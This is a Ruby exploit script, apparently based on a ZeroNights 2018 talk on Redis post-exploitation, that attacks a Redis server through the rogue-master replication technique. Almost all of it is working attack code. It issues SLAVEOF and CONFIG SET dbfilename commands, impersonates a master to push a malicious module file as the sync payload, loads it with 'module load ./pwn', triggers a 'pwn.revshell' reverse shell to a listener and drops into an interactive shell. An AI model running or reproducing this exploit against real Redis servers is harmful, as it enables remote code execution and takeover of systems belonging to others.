#https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

require "socket"

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.sen msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.rec msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

def error msg
	Log.err msg
	exit 1
end

#Our MASTER server
server = TCPServer.new 2421

#We use this connection to force the server to connect to our master server
s = TCPSocket.new('localhost', 6379)
Log.info "Sending SLAVEOF command"
s.puts "SLAVEOF 127.0.0.1 2421"
error "Failed to send SLAVEOF" if !s.gets.start_with? "+OK"
Log.info "Renaming database file"
s.puts "CONFIG SET dbfilename pwn"
error "Failed to set dbfilename" if !s.gets.start_with? "+OK"

class String
	def is_number?
		true if Float(self) rescue false
	end
end

def send msg
	@client.puts msg
	Log.sen msg
end

def rec
	msg = @client.gets
	if msg == nil
		Log.err "Received empty message, the socket prob closed"
		raise
	end
	msg.gsub!(/[\r\n]/, "")
	return msg || ""
end

def parser msg
	return Log.err "Can't parse argument count" if !msg.start_with? "*" or !msg[1..].is_number?
	argument_count = msg[1..].to_i
	arguments = []

	for i in (0..argument_count-1)
		arg_length = rec
		return Log.err "Can't parse argument length" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
		arg_length = arg_length[1..].to_i
		argument = rec
		if argument.length != arg_length
			Log.warn "Argument length and specified length mis-match"
		end
		arguments.push argument
	end
	return arguments
end

payload = File.read("module/module.so")

#We only accept once, it will attempt to make new connections because our data is invalid
@client = server.accept
Log.succ "Succesful connection with slave"

@payload_send = false

# Resync database
loop do
	if msg = rec
		arguments = parser msg
		Log.rec arguments.join " "
		next if !arguments
		case arguments[0]
		when "PING"
			send "+PONG"
		when "REPLCONF"
			send "+OK"
		when "PSYNC", "SYNC"
			#send "+CONTINUE #{arguments[1]} 0"
			send "+FULLRESYNC #{"A" * 40} 1\r\n"
			Log.info "Sending payload..."
			@client.puts "$#{payload.length}\r\n#{payload}"
			@payload_send = true

			#This socket is dead
			break

		end
	end
end

error "Database resync failed, payload not send" if @payload_send == false

@client = s #Reuse old connection to send commands

sleep 0.5
Log.info "Attempt to load module"
send "module load ./pwn"
error "Failed to load module (if it's already loaded use the -s flag)" if !s.gets.start_with? "+OK"
Log.succ "Succesfully loaded the module"

server = TCPServer.new 1234

send "pwn.revshell 127.0.0.1 1234"

shell = server.accept

error "Error connecting to LHOST" if !s.gets.start_with? "+OK"
Log.succ "Succesfull connect-back"

Log.info "Starting (fully upgradeable) shell"

loop do
	begin
		print shell.read_nonblock(1)
	rescue
	end
	begin
		shell.write STDIN.read_nonblock(1)
	rescue
	end
end
